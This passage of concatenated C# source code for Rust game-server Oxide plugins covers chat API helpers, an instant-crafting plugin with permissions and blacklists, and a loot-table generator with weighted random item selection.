                OutMessage = $"{Message.ToLower().Substring(0, 1).ToUpper()}{Message.Remove(0, 1).ToLower()}";

            if (MessageSettings.UseBadWords)
                foreach (var DetectedMessage in OutMessage.Split(' '))
                    if (MessageSettings.BadWords.Contains(DetectedMessage.ToLower()))
                        OutMessage = OutMessage.Replace(DetectedMessage, MessageSettings.ReplaceBadWord);

            player.SendConsoleCommand("chat.add", channel, ulong.Parse(Avatar), $"{PlayerFormat}: {OutMessage}");
        }
        void API_SEND_PLAYER_PM(BasePlayer player, string DisplayName, string Message)
        {
            ReplySystem(Chat.ChatChannel.Global, player, GetLang("COMMAND_PM_SEND_MSG", player.UserIDString, DisplayName, Message));
            Effect.server.Run(config.MessageSetting.SoundPM, player.GetNetworkPosition());
        }
        void API_SEND_PLAYER_CONNECTED(BasePlayer player, string DisplayName, string country, string userID)
        {
            var Alert = config.AlertSettings;
            if (Alert.ConnectedAlert)
            {
                string Avatar = Alert.ConnectedAvatarUse ? userID : "";
                if (config.AlertSettings.ConnectedWorld)
                     ReplyBroadcast(GetLang("WELCOME_PLAYER_WORLD", player.UserIDString, DisplayName, country), "", Avatar);   
                else ReplyBroadcast(GetLang("WELCOME_PLAYER", player.UserIDString, DisplayName), "", Avatar);
            }
        }
        void API_SEND_PLAYER_DISCONNECTED(BasePlayer player, string DisplayName, string reason, string userID)
        {
            var Alert = config.AlertSettings;
            if (Alert.DisconnectedAlert)
            {
                string Avatar = Alert.ConnectedAvatarUse ? userID : "";
                string LangLeave = config.AlertSettings.DisconnectedReason ? GetLang("LEAVE_PLAYER_REASON",player.UserIDString, DisplayName, reason) : GetLang("LEAVE_PLAYER", player.UserIDString, DisplayName);
                ReplyBroadcast(LangLeave, "", Avatar);
            }
        }
        void API_ALERT(string Message, Chat.ChatChannel channel = Chat.ChatChannel.Global, string CustomPrefix = "", string CustomAvatar = "", string CustomHex = "")
        {
            foreach (var p in BasePlayer.activePlayerList)
                ReplySystem(channel, p, Message, CustomPrefix, CustomAvatar, CustomHex);
        }
        void API_ALERT_PLAYER(BasePlayer player,string Message, string CustomPrefix = "", string CustomAvatar = "", string CustomHex = "") => ReplySystem(Chat.ChatChannel.Global, player, Message, CustomPrefix, CustomAvatar, CustomHex);
        void API_ALERT_PLAYER_UI(BasePlayer player, string Message) => UIAlert(player, Message);
        bool API_CHECK_MUTE_CHAT(ulong ID)
        {
            var DataPlayer = ChatSettingUser[ID];
            if (DataPlayer.MuteChatTime > CurrentTime())
                return true;
            else return false;
        }
        bool API_CHECK_VOICE_CHAT(ulong ID)
        {
            var DataPlayer = ChatSettingUser[ID];
            if (DataPlayer.MuteVoiceTime > CurrentTime())
                return true;
            else return false;
        }
        string API_GET_PREFIX(ulong ID)
        {
            var DataPlayer = ChatSettingUser[ID];
            return DataPlayer.ChatPrefix;
        }
        string API_GET_CHAT_COLOR(ulong ID)
        {
            var DataPlayer = ChatSettingUser[ID];
            return DataPlayer.MessageColor;
        }
        string API_GET_NICK_COLOR(ulong ID)
        {
            var DataPlayer = ChatSettingUser[ID];
            return DataPlayer.NickColor;
        }
        string API_GET_DEFUALT_PRFIX() => (string)config.AutoSetupSetting.ReturnDefaultSetting.PrefixDefault;
        string API_GET_DEFUALT_COLOR_NICK() => (string)config.AutoSetupSetting.ReturnDefaultSetting.NickDefault;
        string API_GET_DEFUALT_COLOR_CHAT() => (string)config.AutoSetupSetting.ReturnDefaultSetting.MessageDefault;
        #endregion
    }
}


// --- End of file: IQChat.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/InstantCraft.cs ---
// --- Original Local Path: HudRust/InstantCraft.cs ---

using Newtonsoft.Json;
using System.Collections.Generic;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("Instant Craft", "Orange", "2.1.5")]
    [Description("Allows players to instantly craft items with features")]
    public class InstantCraft : RustPlugin
    {
        #region Vars

        private const string permUse = "instantcraft.use";

        #endregion
        
        #region Oxide Hooks

        private void Init()
        {
            permission.RegisterPermission(permUse, this);
        }
        
        private object OnItemCraft(ItemCraftTask item)
        {
            return OnCraft(item);
        }

        #endregion

        #region Core

        private object OnCraft(ItemCraftTask task)
        {
            if (task.cancelled == true)
            {
                return null;
            }
            
            var player = task.owner;
            var target = task.blueprint.targetItem;
            var targetName = target.shortname;

            if (targetName.Contains("key"))
            {
                return null;
            }
            
            if (permission.UserHasPermission(player.UserIDString, permUse) == false)
            {
                return null;
            }

            if (IsBlocked(targetName))
            {
                task.cancelled = true;
                Message(player, "Blocked");
                GiveRefund(player, task.takenItems);
                return null;
            }

            var stacks = GetStacks(target, task.amount * task.blueprint.amountToCreate);
            var slots = FreeSlots(player);

            if (HasPlace(slots, stacks) == false)
            {
                task.cancelled = true;
                Message(player, "Slots", stacks.Count, slots);
                GiveRefund(player, task.takenItems);
                return null;
            }
            
            if (IsNormalItem(targetName))
            {
                Message(player, "Normal");
                return null;
            }
            
            GiveItem(player, task, target, stacks, task.skinID);
            task.cancelled = true;
            return null;
        }

        private void GiveItem(BasePlayer player, ItemCraftTask task, ItemDefinition def, List<int> stacks, int taskSkinID)
        {
            var skin = ItemDefinition.FindSkin(def.itemid, taskSkinID);
            
            if (config.split == false)
            {
                var final = 0;

                foreach (var stack in stacks)
                {
                    final += stack;
                }
                
                var item = ItemManager.Create(def, final, skin);
                player.GiveItem(item);
                Interface.CallHook("OnItemCraftFinished", task, item);
            }
            else
            {
                foreach (var stack in stacks)
                {
                    var item = ItemManager.Create(def, stack, skin);
                    player.GiveItem(item);
                    Interface.CallHook("OnItemCraftFinished", task, item);
                }
            }
        }

        private int FreeSlots(BasePlayer player)
        {
            var slots = player.inventory.containerMain.capacity + player.inventory.containerBelt.capacity;
            var taken = player.inventory.containerMain.itemList.Count + player.inventory.containerBelt.itemList.Count;
            return slots - taken;
        }

        private void GiveRefund(BasePlayer player, List<Item> items)
        {
            foreach (var item in items)
            {
                player.GiveItem(item);
            }
        }

        private List<int> GetStacks(ItemDefinition item, int amount) 
        {
            var list = new List<int>();
            var maxStack = item.stackable;

            if (maxStack == 0)
            {
                maxStack = 1;
            }

            while (amount > maxStack)
            {
                amount -= maxStack;
                list.Add(maxStack);
            }
            
            list.Add(amount);
            
            return list; 
        }

        private bool IsNormalItem(string name)
        {
            return config.normal?.Contains(name) ?? false;
        }

        private bool IsBlocked(string name)
        {
            return config.blocked?.Contains(name) ?? false;
        }

        private bool HasPlace(int slots, List<int> stacks)
        {
            if (config.checkPlace == false)
            {
                return true;
            }

            if (config.split && slots - stacks.Count < 0)
            {
                return false;
            }

            return slots > 0;
        }

        #endregion

        #region Localization 1.1.1
        
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"Blocked", "Crafting of that item is blocked!"},
                {"Slots", "You don't have enough place to craft! Need {0}, have {1}!"},
                {"Normal", "Item will be crafted with normal speed."}
            }, this);
        }

        private void Message(BasePlayer player, string messageKey, params object[] args)
        {
            if (player == null)
            {
                return;
            }

            var message = GetMessage(messageKey, player.UserIDString, args);
            player.ChatMessage(message);
        }

        private string GetMessage(string messageKey, string playerID, params object[] args)
        {
            return string.Format(lang.GetMessage(messageKey, this, playerID), args);
        }

        #endregion
        
        #region Configuration 1.1.0

        private static ConfigData config;

        private class ConfigData
        {
            [JsonProperty(PropertyName = "Check for free place")]
            public bool checkPlace = false;
            
            [JsonProperty(PropertyName = "Split crafted stacks")]
            public bool split = false;
            
            [JsonProperty(PropertyName = "Normal Speed")]
            public string[] normal =
            {
                "hammer",
                "put item shortname here"
            };

            [JsonProperty(PropertyName = "Blacklist")]
            public string[] blocked =
            {
                "rock",
                "put item shortname here"
            };
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();

            try
            {
                config = Config.ReadObject<ConfigData>();

                if (config == null)
                {
                    LoadDefaultConfig();
                }
            }
            catch
            {
                PrintError("Configuration file is corrupt! Unloading plugin...");
                Interface.Oxide.RootPluginManager.RemovePlugin(this);
                return;
            }

            SaveConfig();
        }

        protected override void LoadDefaultConfig()
        {
            config = new ConfigData();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        #endregion
    }
}

// --- End of file: InstantCraft.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/BetterLoot.cs ---
// --- Original Local Path: HudRust/BetterLoot.cs ---

using Rust;
using System;
using System.Collections.Generic;
using System.Collections;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using UnityEngine;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core.Configuration;
using Random = System.Random;
using Oxide.Core;
using Oxide.Core.Plugins;
using Facepunch.Extend;

namespace Oxide.Plugins
{
    [Info("BetterLoot", "Default", "3.5.3")]
    [Description("A light loot container modification system")]
    public class BetterLoot : RustPlugin
    {
        [PluginReference]
        Plugin CustomLootSpawns;
        static BetterLoot bl = null;
        bool Changed = true;
        int populatedContainers;
        StoredExportNames storedExportNames = new StoredExportNames();
        StoredBlacklist storedBlacklist = new StoredBlacklist();
        Random rng = new Random();
        bool initialized = false;
        Dictionary<string, List<string>[]> Items = new Dictionary<string, List<string>[]>();
        Dictionary<string, List<string>[]> Blueprints = new Dictionary<string, List<string>[]>();
        Dictionary<string, int[]> itemWeights = new Dictionary<string, int[]>();
        Dictionary<string, int[]> blueprintWeights = new Dictionary<string, int[]>();
        Dictionary<string, int> totalItemWeight = new Dictionary<string, int>();
        Dictionary<string, int> totalBlueprintWeight = new Dictionary<string, int>();
        DynamicConfigFile lootTable;

        DynamicConfigFile getFile(string file) => Interface.Oxide.DataFileSystem.GetDatafile($"{this.Title}/{file}");
        bool chkFile(string file) => Interface.Oxide.DataFileSystem.ExistsDatafile($"{this.Title}/{file}");
        Dictionary<string, object> lootTables = null;

        static List<object> lootPrefabDefaults()
        {
            var dp = new List<object>()
            {
                "assets/bundled/prefabs/radtown/crate_basic.prefab",
                "assets/bundled/prefabs/radtown/crate_elite.prefab",
                "assets/bundled/prefabs/radtown/crate_mine.prefab",
                "assets/bundled/prefabs/radtown/crate_normal.prefab",
                "assets/bundled/prefabs/radtown/crate_normal_2.prefab",
                "assets/bundled/prefabs/radtown/crate_normal_2_food.prefab",
                "assets/bundled/prefabs/radtown/crate_normal_2_medical.prefab",
                "assets/bundled/prefabs/radtown/crate_tools.prefab",
                "assets/bundled/prefabs/radtown/crate_underwater_advanced.prefab",
                "assets/bundled/prefabs/radtown/crate_underwater_basic.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm ammo.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm c4.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm construction resources.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm construction tools.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm food.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm medical.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm res.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm tier1 lootbox.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm tier2 lootbox.prefab",
                "assets/bundled/prefabs/radtown/dmloot/dm tier3 lootbox.prefab",
                "assets/bundled/prefabs/radtown/vehicle_parts.prefab",
                "assets/bundled/prefabs/radtown/foodbox.prefab",
                "assets/bundled/prefabs/radtown/loot_barrel_1.prefab",
                "assets/bundled/prefabs/radtown/loot_barrel_2.prefab",
                "assets/bundled/prefabs/autospawn/resource/loot/loot-barrel-1.prefab",
                "assets/bundled/prefabs/autospawn/resource/loot/loot-barrel-2.prefab",
                "assets/bundled/prefabs/autospawn/resource/loot/trash-pile-1.prefab",
                "assets/bundled/prefabs/radtown/loot_trash.prefab",
                "assets/bundled/prefabs/radtown/minecart.prefab",
                "assets/bundled/prefabs/radtown/oil_barrel.prefab",
                "assets/prefabs/npc/m2bradley/bradley_crate.prefab",
                "assets/prefabs/npc/patrol helicopter/heli_crate.prefab",
                "assets/prefabs/deployable/chinooklockedcrate/codelockedhackablecrate.prefab",
                "assets/prefabs/deployable/chinooklockedcrate/codelockedhackablecrate_oilrig.prefab",
                "assets/prefabs/misc/supply drop/supply_drop.prefab",
                //"assets/prefabs/npc/scientist/scientist_corpse.prefab"
            };
            return dp;
        }

        void LoadAllContainers()
        {
            try { lootTable = getFile("LootTables"); }
            catch (JsonReaderException e)
            {
                PrintWarning($"JSON error in 'LootTables' > Line: {e.LineNumber} | {e.Path}");
                Interface.GetMod().UnloadPlugin(this.Title);
                return;
            }
            lootTables = new Dictionary<string, object>();
            lootTables = lootTable["LootTables"] as Dictionary<string, object>;
            if (lootTables == null)
                lootTables = new Dictionary<string, object>();
            bool wasAdded = false;
            foreach (var lootPrefab in lootPrefabsToUse)
            {
                if (!lootTables.ContainsKey((string)lootPrefab))
                {
                    var loot = GameManager.server.FindPrefab((string)lootPrefab)?.GetComponent<LootContainer>();
                    if (loot == null)
                        continue;
                    var container = new Dictionary<string, object>();
                    container.Add("Enabled", !((string)lootPrefab).Contains("bradley_crate") && !((string)lootPrefab).Contains("heli_crate"));
                    container.Add("Scrap", loot.scrapAmount);
                    int slots = 0;
                    if (loot.LootSpawnSlots.Length > 0)
                    {
                        LootContainer.LootSpawnSlot[] lootSpawnSlots = loot.LootSpawnSlots;
                        for (int i = 0; i < lootSpawnSlots.Length; i++)
                            slots += lootSpawnSlots[i].numberToSpawn;
                    }
                    else
                        slots = loot.maxDefinitionsToSpawn;
                    container.Add("ItemsMin", slots);
                    container.Add("ItemsMax", slots);
                    container.Add("MaxBPs", 1);
                    var itemList = new Dictionary<string, object>();
                    if (loot.lootDefinition != null)
                        GetLootSpawn(loot.lootDefinition, ref itemList);
                    else if (loot.LootSpawnSlots.Length > 0)
                    {
                        LootContainer.LootSpawnSlot[] lootSpawnSlots = loot.LootSpawnSlots;
                        foreach (var lootSpawnSlot in lootSpawnSlots)
                        {
                            GetLootSpawn(lootSpawnSlot.definition, ref itemList);
                        }
                    }
                    container.Add("ItemList", itemList);
                    lootTables.Add((string)lootPrefab, container);
                    wasAdded = true;
                }

            }
            if (wasAdded)
            {
                lootTable.Set("LootTables", lootTables);
                lootTable.Save();
            }
            wasAdded = false;
            bool wasRemoved = false;
            int activeTypes = 0;
            foreach (var lootTable in lootTables.ToList())
            {
                var loot = GameManager.server.FindPrefab(lootTable.Key)?.GetComponent<LootContainer>();
                if (loot == null)
                {
                    lootTables.Remove(lootTable.Key);
                    wasRemoved = true;
                    continue;
                }
                var container = lootTable.Value as Dictionary<string, object>;
                if (!container.ContainsKey("Enabled"))
                {
                    container.Add("Enabled", true);
                    wasAdded = true;
                }
                if ((bool)container["Enabled"])
                    activeTypes++;
                if (!container.ContainsKey("Scrap"))
                {
                    container.Add("Scrap", loot.scrapAmount);
                    wasAdded = true;
                }

                int slots = 0;
                if (loot.LootSpawnSlots.Length > 0)
                {
                    LootContainer.LootSpawnSlot[] lootSpawnSlots = loot.LootSpawnSlots;
                    for (int i = 0; i < lootSpawnSlots.Length; i++)
                        slots += lootSpawnSlots[i].numberToSpawn;
                }
                else
                    slots = loot.maxDefinitionsToSpawn;
                if (!container.ContainsKey("MaxBPs"))
                {
                    container.Add("MaxBPs", 1);
                    wasAdded = true;
                }
                if (!container.ContainsKey("ItemsMin"))
                {
                    container.Add("ItemsMin", slots);
                    wasAdded = true;
                }
                if (!container.ContainsKey("ItemsMax"))
                {
                    container.Add("ItemsMax", slots);
                    wasAdded = true;
                }
                if (!container.ContainsKey("ItemsMax"))
                {
                    container.Add("ItemsMax", slots);
                    wasAdded = true;
                }
                if (!container.ContainsKey("ItemList"))
                {
                    var itemList = new Dictionary<string, object>();
                    if (loot.lootDefinition != null)
                        GetLootSpawn(loot.lootDefinition, ref itemList);
                    else if (loot.LootSpawnSlots.Length > 0)
                    {
                        LootContainer.LootSpawnSlot[] lootSpawnSlots = loot.LootSpawnSlots;
                        for (int i = 0; i < lootSpawnSlots.Length; i++)
                        {
                            LootContainer.LootSpawnSlot lootSpawnSlot = lootSpawnSlots[i];
                            GetLootSpawn(lootSpawnSlot.definition, ref itemList);
                        }
                    }
                    container.Add("ItemList", itemList);
                    wasAdded = true;
                }
                Items.Add(lootTable.Key, new List<string>[5]);
                Blueprints.Add(lootTable.Key, new List<string>[5]);
                for (var i = 0; i < 5; ++i)
                {
                    Items[lootTable.Key][i] = new List<string>();
                    Blueprints[lootTable.Key][i] = new List<string>();
                }
                foreach (var itemEntry in container["ItemList"] as Dictionary<string, object>)
                {
                    bool isBP = itemEntry.Key.EndsWith(".blueprint") ? true : false;
                    var def = ItemManager.FindItemDefinition(itemEntry.Key.Replace(".blueprint", ""));

                    if (def != null)
                    {
                        if (isBP && def.Blueprint != null && def.Blueprint.isResearchable)
                        {
                            int index = (int)def.rarity;
                            if (!Blueprints[lootTable.Key][index].Contains(def.shortname))
                                Blueprints[lootTable.Key][index].Add(def.shortname);
                        }
                        else
                        {
                            int index = 0;
                            object indexoverride;
                            if (rarityItemOverride.TryGetValue(def.shortname, out indexoverride))
                                index = Convert.ToInt32(indexoverride);
                            else
                                index = (int)def.rarity;
                            if (!Items[lootTable.Key][index].Contains(def.shortname))
                                Items[lootTable.Key][index].Add(def.shortname);
                        }
                    }
                }
                totalItemWeight.Add(lootTable.Key, 0);
                totalBlueprintWeight.Add(lootTable.Key, 0);
                itemWeights.Add(lootTable.Key, new int[5]);
                blueprintWeights.Add(lootTable.Key, new int[5]);
                for (var i = 0; i < 5; ++i)
                {
                    totalItemWeight[lootTable.Key] += (itemWeights[lootTable.Key][i] = ItemWeight(baseItemRarity, i) * Items[lootTable.Key][i].Count);
                    totalBlueprintWeight[lootTable.Key] += (blueprintWeights[lootTable.Key][i] = ItemWeight(baseItemRarity, i) * Blueprints[lootTable.Key][i].Count);
                }

            }
            if (wasAdded || wasRemoved)
            {
                lootTable.Set("LootTables", lootTables);
                lootTable.Save();
            }
            lootTable.Clear();
            Puts($"Using '{activeTypes}' active of '{lootTables.Count}' supported containertypes");
        }

        int ItemWeight(double baseRarity, int index) { return (int)(Math.Pow(baseRarity, 4 - index) * 1000); }

        void GetLootSpawn(LootSpawn lootSpawn, ref Dictionary<string, object> items)
        {
            if (lootSpawn.subSpawn != null && lootSpawn.subSpawn.Length > 0)
            {
                foreach (var entry in lootSpawn.subSpawn)
                    GetLootSpawn(entry.category, ref items);
                return;
            }
            if (lootSpawn.items != null && lootSpawn.items.Length > 0)
            {
                foreach (var amount in lootSpawn.items)
                {
                    object options = GetAmounts(amount, 1);
                    string itemName = amount.itemDef.shortname;
                    if (amount.itemDef.spawnAsBlueprint)
                        itemName += ".blueprint";
                    if (!items.ContainsKey(itemName))
                        items.Add(itemName, options);
                }
            }
        }

        object GetAmounts(ItemAmount amount, int mul = 1)
        {
            if (amount.itemDef.isWearable || (amount.itemDef.condition.enabled && amount.itemDef.GetComponent<ItemModDeployable>() == null))
                mul = 1;
            object options = new Dictionary<string, object>
            {
                ["Min"] = (int)amount.amount * mul,
                ["Max"] = ((ItemAmountRanged)amount).maxAmount > 0f &&
                          ((ItemAmountRanged)amount).maxAmount > amount.amount
                    ? (int)((ItemAmountRanged)amount).maxAmount * mul
                    : (int)amount.amount * mul,
                

            };
            return options;
        }

        static Dictionary<string, object> defaultItemOverride()
        {
            var dp = new Dictionary<string, object>();
            dp.Add("autoturret", 4);
            dp.Add("lmg.m249", 4);
            dp.Add("targeting.computer", 3);
            return dp;
        }

        double baseItemRarity;
        double blueprintProbability;
        bool removeStackedContainers;
        bool listUpdatesOnLoaded;
        double hammerLootCycleTime;
        int lootMultiplier;
        int scrapMultiplier;
        bool enableHammerLootCycle;
        Dictionary<string, object> rarityItemOverride = null;
        List<object> lootPrefabsToUse = null;

        object GetConfig(string menu, string datavalue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
                Changed = true;
            }
            object value;
            if (data.TryGetValue(datavalue, out value)) return value;
            value = defaultValue;
            data[datavalue] = value;
            Changed = true;
            return value;
        }

        void LoadVariables()
        {
            baseItemRarity = 2;
            rarityItemOverride = (Dictionary<string, object>)GetConfig("Rarity", "Override", defaultItemOverride());
            lootPrefabsToUse = (List<object>)GetConfig("Generic", "WatchedPrefabs", lootPrefabDefaults());
            listUpdatesOnLoaded = Convert.ToBoolean(GetConfig("Generic", "listUpdatesOnLoaded", true));
            removeStackedContainers = Convert.ToBoolean(GetConfig("Generic", "removeStackedContainers", true));
            blueprintProbability = Convert.ToDouble(GetConfig("Generic", "blueprintProbability", 0.11));
            hammerLootCycleTime = Convert.ToDouble(GetConfig("Loot", "hammerLootCycleTime", 3));
            lootMultiplier = Convert.ToInt32(GetConfig("Loot", "lootMultiplier", 1));
            scrapMultiplier = Convert.ToInt32(GetConfig("Loot", "scrapMultiplier", 1));
            enableHammerLootCycle = Convert.ToBoolean(GetConfig("Loot", "enableHammerLootCycle", false));

            if (!Changed) return;
            SaveConfig();
            Changed = false;
        }

        class StoredBlacklist
        {
            public List<string> ItemList = new List<string>();

            public StoredBlacklist()
            {
            }
        }

        void LoadBlacklist()
        {
            storedBlacklist = Interface.GetMod().DataFileSystem.ReadObject<StoredBlacklist>("BetterLoot\\Blacklist");
            if (storedBlacklist.ItemList.Count == 0)
            {
                Puts("No Blacklist found, creating new file...");
                storedBlacklist = new StoredBlacklist();
                storedBlacklist.ItemList.Add("flare");
                Interface.GetMod().DataFileSystem.WriteObject("BetterLoot\\Blacklist", storedBlacklist);
                return;
            }
        }

        void SaveBlacklist() => Interface.GetMod().DataFileSystem.WriteObject("BetterLoot\\Blacklist", storedBlacklist);

        protected override void LoadDefaultConfig()
        {
            Config.Clear();
            LoadVariables();
        }

        void Init()
        {
            LoadVariables();
            LoadBlacklist();
            bl = this;
        }

        void OnServerInitialized()
        {
            ItemManager.Initialize();
            LoadAllContainers();
            UpdateInternals(listUpdatesOnLoaded);
        }


        //void OnLootEntity(BasePlayer player, BaseEntity target)
        //{
            //Puts($"{player.displayName} looted {target.PrefabName}");
        //}

        void Unload() 
        {
            var gameObjects = UnityEngine.Object.FindObjectsOfType<HammerHitLootCycle>().ToList();
            if (gameObjects.Count > 0) 
            {
                foreach (var objects in gameObjects) 
                {
                    UnityEngine.Object.Destroy(objects);
                }
            }
        }

        void UpdateInternals(bool doLog)
        {
            SaveExportNames();
            if (Changed)
            {
                SaveConfig();
                Changed = false;
            }
            Puts("Updating internals ...");
            populatedContainers = 0;
            NextTick(() =>
           {
               if (removeStackedContainers)
                   FixLoot();
               foreach (var container in BaseNetworkable.serverEntities.Where(p => p != null && p.GetComponent<BaseEntity>() != null && p is LootContainer).Cast<LootContainer>().ToList())
               {
                   if (container == null)
                       continue;
                   if (CustomLootSpawns != null && (CustomLootSpawns && (bool)CustomLootSpawns?.Call("IsLootBox", container.GetComponent<BaseEntity>())))
                       continue;
                   if (PopulateContainer(container))
                       populatedContainers++;
               }


               Puts($"Populated '{populatedContainers}' supported containers.");
               initialized = true;
               populatedContainers = 0;
               ItemManager.DoRemoves();
           });
        }


        void FixLoot()
        {
            var spawns = Resources.FindObjectsOfTypeAll<LootContainer>()
                .Where(c => c.isActiveAndEnabled).
                OrderBy(c => c.transform.position.x).ThenBy(c => c.transform.position.z).ThenBy(c => c.transform.position.z)
                .ToList();

            var count = spawns.Count();
            var racelimit = count * count;

            var antirace = 0;
            var deleted = 0;

            for (var i = 0; i < count; i++)
            {
                var box = spawns[i];
                var pos = new Vector2(box.transform.position.x, box.transform.position.z);

                if (++antirace > racelimit)
                {
                    return;
                }

                var next = i + 1;
                while (next < count)
                {
                    var box2 = spawns[next];
                    var pos2 = new Vector2(box2.transform.position.x, box2.transform.position.z);
                    var distance = Vector2.Distance(pos, pos2);

                    if (++antirace > racelimit)
                    {
                        return;
                    }

                    if (distance < 0.25f)
                    {
                        spawns.RemoveAt(next);
                        count--;
                        (box2 as BaseEntity).KillMessage();
                        deleted++;
                    }
                    else break;
                }
            }

            if (deleted > 0)
                Puts($"Removed {deleted} stacked LootContainer");
            else
                Puts($"No stacked LootContainer found.");
            ItemManager.DoRemoves();
        }

        bool PopulateContainer(LootContainer container)
        {
            Dictionary<string, object> con;
            object containerobj;
            if (!lootTables.TryGetValue(container.PrefabName, out containerobj))
                return false;
            con = containerobj as Dictionary<string, object>;
            if (!(bool)con["Enabled"])
                return false;
            var lootitemcount = (con["ItemList"] as Dictionary<string, object>)?.Count();
            int itemCount = Mathf.RoundToInt(UnityEngine.Random.Range(Convert.ToSingle(Mathf.Min((int)con["ItemsMin"], (int)con["ItemsMax"])) * 100f, Convert.ToSingle(Mathf.Max((int)con["ItemsMin"], (int)con["ItemsMax"])) * 100f) / 100f);
            if (lootitemcount > 0 && itemCount > lootitemcount && lootitemcount < 36)
                itemCount = (int)lootitemcount;
            if (container.inventory == null)
            {
                container.inventory = new ItemContainer();
                container.inventory.ServerInitialize(null, 36);
                container.inventory.GiveUID();
            }
            else
            {
                while (container.inventory.itemList.Count > 0)
                {
                    var item = container.inventory.itemList[0];
                    item.RemoveFromContainer();
                    item.Remove(0f);
                }
                container.inventory.capacity = 36;
            }
            var items = new List<Item>();
            var itemNames = new List<string>();
            var itemBlueprints = new List<int>();
            var maxRetry = 10;
            for (int i = 0; i < itemCount; ++i)
            {
                if (maxRetry == 0)
                {
                    break;
                }
                var item = MightyRNG(container.PrefabName, itemCount, (bool)(itemBlueprints.Count >= (int)con["MaxBPs"]));

                if (item == null)
                {
                    --maxRetry;
                    --i;
                    continue;
                }
                if (itemNames.Contains(item.info.shortname) || (item.IsBlueprint() && itemBlueprints.Contains(item.blueprintTarget)))
                {
                    item.Remove(0f);
                    --maxRetry;
                    --i;
                    continue;
                }
                else
                    if (item.IsBlueprint())
                    itemBlueprints.Add(item.blueprintTarget);
                else
                    itemNames.Add(item.info.shortname);
                items.Add(item);
                if (storedBlacklist.ItemList.Contains(item.info.shortname)) 
                {
                    items.Remove(item);
                }
            }
            foreach (var item in items.Where(x => x != null && x.IsValid()))
                item.MoveToContainer(container.inventory, -1, false);
            if ((int)con["Scrap"] > 0)
            {
                int scrapCount = (int)con["Scrap"];
                Item item = ItemManager.Create(ItemManager.FindItemDefinition("scrap"), scrapCount * scrapMultiplier, 0uL); 
                item.MoveToContainer(container.inventory, -1, false);
            }
            container.inventory.capacity = container.inventory.itemList.Count;
            container.inventory.MarkDirty();
            container.SendNetworkUpdate();
            populatedContainers++;
            return true;
        }

        Item MightyRNG(string type, int itemCount, bool blockBPs = false)
        {
            bool asBP = rng.NextDouble() < blueprintProbability && !blockBPs;
            List<string> selectFrom;
            int limit = 0;
            string itemName;
            Item item;
            int maxRetry = 10 * itemCount;
            do
            {
                selectFrom = null;
                item = null;
                if (asBP)
                {
                    var r = rng.Next(totalBlueprintWeight[type]);
                    for (var i = 0; i < 5; ++i)
                    {
                        limit += blueprintWeights[type][i];
                        if (r < limit)
                        {
                            selectFrom = Blueprints[type][i];
                            break;
                        }
                    }
                }
                else
                {
                    var r = rng.Next(totalItemWeight[type]);
                    for (var i = 0; i < 5; ++i)
                    {
                        limit += itemWeights[type][i];
                        if (r < limit)
                        {
                            selectFrom = Items[type][i];
                            break;
                        }
                    }
                }
                if (selectFrom == null)
                {
                    if (--maxRetry <= 0)
                        break;
                    continue;
                }
                itemName = selectFrom[rng.Next(0, selectFrom.Count)];
                ItemDefinition itemDef = ItemManager.FindItemDefinition(itemName);
                if (asBP && itemDef.Blueprint != null && itemDef.Blueprint.isResearchable)
                {
                    var blueprintBaseDef = ItemManager.FindItemDefinition("blueprintbase");
                    item = ItemManager.Create(blueprintBaseDef, 1, 0uL);
                    item.blueprintTarget = itemDef.itemid;
                }
                else
                    item = ItemManager.CreateByName(itemName, 1);
                if (item == null || item.info == null)
                    continue;
                break;
            } while (true);
            if (item == null)
                return null;
            object itemOptions;
            if (((lootTables[type] as Dictionary<string, object>)["ItemList"] as Dictionary<string, object>).TryGetValue(item.info.shortname, out itemOptions))
            {
                Dictionary<string, object> options = itemOptions as Dictionary<string, object>;
                item.amount = UnityEngine.Random.Range(Math.Min((int)options["Min"], (int)options["Max"]), Math.Max((int)options["Min"], (int)options["Max"])) * lootMultiplier;
                //if (options.ContainsKey("SkinId"))
                    //item.skin = (uint)options["SkinId"];

            }
            item.OnVirginSpawn();
            return item;
        }

        object OnLootSpawn(LootContainer container)
        {
            if (!initialized || container == null)
                return null;
            if (CustomLootSpawns != null && (CustomLootSpawns && (bool)CustomLootSpawns?.Call("IsLootBox", container.GetComponent<BaseEntity>())))
                return null;
            if (PopulateContainer(container))
            {
                ItemManager.DoRemoves();
                return true;
            }
            return null;
        }

        static int RarityIndex(Rarity rarity)
        {
            switch (rarity)
            {
                case Rarity.None: return 0;
                case Rarity.Common: return 1;
                case Rarity.Uncommon: return 2;
                case Rarity.Rare: return 3;
                case Rarity.VeryRare: return 4;
            }
            return -1;
        }

        bool ItemExists(string name)
        {
            foreach (var def in ItemManager.itemList)
            {
                if (def.shortname != name)
                    continue;
                var testItem = ItemManager.CreateByName(name, 1);
                if (testItem != null)
                {
                    testItem.Remove(0f);
                    return true;
                }
            }
            return false;
        }

        bool isSupplyDropActive()
        {
            Dictionary<string, object> con;
            object containerobj;
            if (!lootTables.TryGetValue("assets/prefabs/misc/supply drop/supply_drop.prefab", out containerobj))
                return false;
            con = containerobj as Dictionary<string, object>;
            if ((bool)con["Enabled"])
                return true;
            return false;
        }

        class StoredExportNames
        {
            public int version;
            public Dictionary<string, string> AllItemsAvailable = new Dictionary<string, string>();
            public StoredExportNames()
            {
            }
        }

        void SaveExportNames()
        {
